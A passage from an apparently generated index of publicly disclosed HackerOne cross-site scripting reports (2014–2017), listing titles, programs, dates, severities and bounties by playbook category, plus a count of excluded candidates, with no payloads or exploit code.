| FILE-009 | [WordPress Flash XSS in *flashmediaelement.swf*](https://hackerone.com/reports/134546) | Automattic | 2016-04-26T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [File-Upload-and-SVG-XSS.md](../../File-Upload-and-SVG-XSS.md) |
| FILE-010 | [XSS in Subtitles of Vimeo Flash Player and Hubnut](https://hackerone.com/reports/137023) | Vimeo | 2016-05-07T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [File-Upload-and-SVG-XSS.md](../../File-Upload-and-SVG-XSS.md) |
| FILE-011 | [Wordpress flashmediaelement.swf XSS on stopthehacker.com](https://hackerone.com/reports/137964) | StopTheHacker | 2016-05-11T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [File-Upload-and-SVG-XSS.md](../../File-Upload-and-SVG-XSS.md) |
| FILE-012 | [Stored XSS using SVG](https://hackerone.com/reports/148853) | Paragon Initiative Enterprises | 2016-07-02T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [File-Upload-and-SVG-XSS.md](../../File-Upload-and-SVG-XSS.md) |
| FILE-013 | [Flash XSS on global nav](https://hackerone.com/reports/172809) | General Motors | 2016-09-29T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [File-Upload-and-SVG-XSS.md](../../File-Upload-and-SVG-XSS.md) |
| FILE-014 | [Flash XSS on homepage fliptilescroller](https://hackerone.com/reports/172821) | General Motors | 2016-09-29T00:00:00 | none | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [File-Upload-and-SVG-XSS.md](../../File-Upload-and-SVG-XSS.md) |
| FILE-015 | [Flash XSS on Buick_RotatingMasthead_JellyBeanSlider.swf](https://hackerone.com/reports/179826) | General Motors | 2016-11-03T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [File-Upload-and-SVG-XSS.md](../../File-Upload-and-SVG-XSS.md) |
| FILE-016 | [XSS in IE11 on portswigger.net via Flash](https://hackerone.com/reports/182160) | PortSwigger Web Security | 2016-11-14T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [File-Upload-and-SVG-XSS.md](../../File-Upload-and-SVG-XSS.md) |
| FILE-017 | [XSS in flashmediaelement.swf (business-blog.zomato.com)](https://hackerone.com/reports/200351) | Zomato | 2017-01-22T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [File-Upload-and-SVG-XSS.md](../../File-Upload-and-SVG-XSS.md) |
| FILE-018 | [XSS via SVG file](https://hackerone.com/reports/212253) | Ubiquiti Networks | 2017-03-10T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [File-Upload-and-SVG-XSS.md](../../File-Upload-and-SVG-XSS.md) |

<details><summary>Retrieval limitations for this group</summary>

- FILE-008 (https://hackerone.com/reports/130591): Partial report (official disclosure summary only).
- FILE-010 (https://hackerone.com/reports/137023): Partial report (official disclosure summary only).
- FILE-013 (https://hackerone.com/reports/172809): Partial report (official disclosure summary only).
- FILE-014 (https://hackerone.com/reports/172821): Partial report (official disclosure summary only).
- FILE-015 (https://hackerone.com/reports/179826): Partial report (official disclosure summary only).

</details>

#### HTML-Injection → [`HTML-Injection.md`](../../HTML-Injection.md)

13 sources. Weakness field as published by HackerOne:

- Cross-site Scripting (XSS) - Generic: 13

| Case ID | Original report title | Program | Published | Severity | Bounty | Weakness (H1) | Affected asset | Evidence | Playbook |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| HTML-001 | [HTML injection in "Invite Collaborators"](https://hackerone.com/reports/2735) | RelateIQ | 2014-03-02T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [HTML-Injection.md](../../HTML-Injection.md) |
| HTML-002 | [Cross-Site Scripting in getMarketplacePurchaseFrame](https://hackerone.com/reports/6843) | concrete5 | 2014-04-10T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [HTML-Injection.md](../../HTML-Injection.md) |
| HTML-003 | [Reflected XSS in cart at hardware.shopify.com](https://hackerone.com/reports/95089) | Shopify | 2015-10-21T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [HTML-Injection.md](../../HTML-Injection.md) |
| HTML-004 | [HTML injection via 'underlying' parameter](https://hackerone.com/reports/109832) | Binary.com | 2016-01-11T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [HTML-Injection.md](../../HTML-Injection.md) |
| HTML-005 | [Log pollution can lead to HTML Injection.](https://hackerone.com/reports/146278) | Nextcloud | 2016-06-21T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [HTML-Injection.md](../../HTML-Injection.md) |
| HTML-006 | [Html Injection and Possible XSS in sms-be-vip.twitter.com](https://hackerone.com/reports/150179) | Twitter | 2016-07-09T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [HTML-Injection.md](../../HTML-Injection.md) |
| HTML-007 | [Bad content-type in response header when getting document can lead to html injection](https://hackerone.com/reports/173721) | Nextcloud | 2016-10-03T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [HTML-Injection.md](../../HTML-Injection.md) |
| HTML-008 | [Reflected XSS on blockchain.info](https://hackerone.com/reports/179426) | Blockchain | 2016-11-01T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [HTML-Injection.md](../../HTML-Injection.md) |
| HTML-009 | [HTML injection vulnerability on a DoD website](https://hackerone.com/reports/191902) | U.S. Dept Of Defense | 2016-12-17T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [HTML-Injection.md](../../HTML-Injection.md) |
| HTML-010 | [HTML Injection possible due to bad filter](https://hackerone.com/reports/198907) | VK.com | 2017-01-17T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [HTML-Injection.md](../../HTML-Injection.md) |
| HTML-011 | [[nutty.ubnt.com] DOM Based XSS nuttyapp github-btn.html](https://hackerone.com/reports/200753) | Ubiquiti Networks | 2017-01-24T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [HTML-Injection.md](../../HTML-Injection.md) |
| HTML-012 | [[github.algolia.com] DOM Based XSS github-btn.html](https://hackerone.com/reports/200826) | Algolia | 2017-01-24T00:00:00 | medium | $100 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [HTML-Injection.md](../../HTML-Injection.md) |
| HTML-013 | [HTML injection in Desktop Client](https://hackerone.com/reports/206877) | ownCloud | 2017-02-16T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [HTML-Injection.md](../../HTML-Injection.md) |

<details><summary>Retrieval limitations for this group</summary>

- HTML-004 (https://hackerone.com/reports/109832): Partial report (official disclosure summary only).
- HTML-009 (https://hackerone.com/reports/191902): Partial report (official disclosure summary only).

</details>

#### Browser-Extension-and-Messaging-XSS → [`Browser-Extension-and-Messaging-XSS.md`](../../Browser-Extension-and-Messaging-XSS.md)

8 sources. Weakness field as published by HackerOne:

- Cross-site Scripting (XSS) - Generic: 8

| Case ID | Original report title | Program | Published | Severity | Bounty | Weakness (H1) | Affected asset | Evidence | Playbook |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| BROW-001 | [XSS platform.twitter.com](https://hackerone.com/reports/29328) | Twitter | 2014-09-28T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Browser-Extension-and-Messaging-XSS.md](../../Browser-Extension-and-Messaging-XSS.md) |
| BROW-002 | [File Upload XSS in image uploading of App in mopub](https://hackerone.com/reports/97672) | Twitter | 2015-11-04T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Browser-Extension-and-Messaging-XSS.md](../../Browser-Extension-and-Messaging-XSS.md) |
| BROW-003 | [XSS at www.woothemes.com](https://hackerone.com/reports/111365) | Automattic | 2016-01-18T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Browser-Extension-and-Messaging-XSS.md](../../Browser-Extension-and-Messaging-XSS.md) |
| BROW-004 | [www.veris.in DOM based XSS](https://hackerone.com/reports/119453) | Veris | 2016-02-29T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Browser-Extension-and-Messaging-XSS.md](../../Browser-Extension-and-Messaging-XSS.md) |
| BROW-005 | [Stored XSS in Adress Book (starbucks.com/account/profile)](https://hackerone.com/reports/186554) | Starbucks | 2016-11-29T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | www.starbucks.com | Full report | [Browser-Extension-and-Messaging-XSS.md](../../Browser-Extension-and-Messaging-XSS.md) |
| BROW-006 | [CRLF and XSS stored on ton.twitter.com](https://hackerone.com/reports/191380) | Twitter | 2016-12-15T00:00:00 | Not disclosed in the source | $1,680 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Browser-Extension-and-Messaging-XSS.md](../../Browser-Extension-and-Messaging-XSS.md) |
| BROW-007 | [XSS Vulnerability on Image link parser](https://hackerone.com/reports/191909) | Discourse | 2016-12-17T00:00:00 | high | $256 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Browser-Extension-and-Messaging-XSS.md](../../Browser-Extension-and-Messaging-XSS.md) |
| BROW-008 | [XSS in $shop$.myshopify.com/admin/ via "Button Objects" in malicious app](https://hackerone.com/reports/217745) | Shopify | 2017-04-02T00:00:00 | high | $800 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Browser-Extension-and-Messaging-XSS.md](../../Browser-Extension-and-Messaging-XSS.md) |

<details><summary>Retrieval limitations for this group</summary>

- Every source in this group was retrieved with its full report body.

</details>

#### Framework-and-Template-XSS → [`Framework-and-Template-XSS.md`](../../Framework-and-Template-XSS.md)

4 sources. Weakness field as published by HackerOne:

- Cross-site Scripting (XSS) - Generic: 4

| Case ID | Original report title | Program | Published | Severity | Bounty | Weakness (H1) | Affected asset | Evidence | Playbook |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| FRAM-001 | [Reflected XSS on developer.uber.com via Angular template injection](https://hackerone.com/reports/125027) | Uber | 2016-03-22T00:00:00 | Not disclosed in the source | $3,000 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Framework-and-Template-XSS.md](../../Framework-and-Template-XSS.md) |
| FRAM-002 | [Angular injection in the profile name of onpatient](https://hackerone.com/reports/141240) | drchrono | 2016-05-26T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Framework-and-Template-XSS.md](../../Framework-and-Template-XSS.md) |
| FRAM-003 | [Stored XSS via AngularJS Injection](https://hackerone.com/reports/141463) | drchrono | 2016-05-27T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Framework-and-Template-XSS.md](../../Framework-and-Template-XSS.md) |
| FRAM-004 | [XSS in $shop$.myshopify.com/admin/ via twine template injection in "Shopify.API.Modal.input" method when using a malicious app](https://hackerone.com/reports/217790) | Shopify | 2017-04-02T00:00:00 | high | $1,000 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Framework-and-Template-XSS.md](../../Framework-and-Template-XSS.md) |

<details><summary>Retrieval limitations for this group</summary>

- Every source in this group was retrieved with its full report body.

</details>

---

### Sources excluded from the curated set

The 910 title-level candidates included entries that HackerOne itself classified
under a non-XSS weakness, or that matched an XSS search term only incidentally.
These were removed from the inventory rather than silently included:

| HackerOne weakness field of excluded entries | Count |
| --- | ---: |
| Cross-site Scripting (XSS) - Generic | 514 |
| Unclassified | 304 |
| Cross-site Scripting (XSS) - Stored | 22 |
| Cross-site Scripting (XSS) - Reflected | 19 |
| Command Injection - Generic | 9 |
| Violation of Secure Design Principles | 8 |
| Cross-Site Request Forgery (CSRF) | 8 |
| Cross-site Scripting (XSS) - DOM | 7 |
| Code Injection | 6 |
| Information Disclosure | 3 |
| Uncontrolled Resource Consumption | 3 |
| Cryptographic Issues - Generic | 2 |
| Resource Injection | 2 |
| HTTP Response Splitting | 1 |
| Classic Buffer Overflow | 1 |
| CRLF Injection | 1 |

Note: this table counts archive candidates by their published weakness field. A
small number of entries were excluded even though HackerOne labelled them
`Cross-site Scripting (XSS) - Generic` but whose bodies showed no executable
behaviour. Those are retained here as HTML-Injection or Context-Based sources rather
than being claimed as proven script execution.



---

*Consolidated from 12 source files on 2026-10-12. Archive accessed
2026-10-12; archive last updated 2017-09-12. Generated by concatenating the canonical
files — edit those, not this one.*
